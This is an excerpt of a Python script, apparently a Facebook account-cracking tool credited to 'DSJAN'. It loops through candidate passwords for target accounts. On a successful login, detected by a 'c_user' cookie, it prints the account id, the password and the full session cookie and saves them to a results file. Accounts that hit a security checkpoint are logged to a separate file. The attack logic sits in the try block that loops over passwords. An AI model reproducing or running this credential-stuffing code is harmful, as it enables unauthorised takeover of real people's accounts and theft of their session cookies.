...
--------------------------------------------------
[•] AUTHOR     : \033[1;32mDSJAN\033[1;37m
...
def rehan():
	...
	if gh =='1':
		...
		os.system('xdg-openhttps://www.facebook.com/profile.php?id=100067086768893&mibextid=ZbWKwL')
	elif gh =='0':
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[DSJAN-OK] '+cid+'|'+ps+'\033[0;97m\n[‎‎🍁]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                open('DS-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                # print('\033[1;33m[DSJAN-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('DS-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
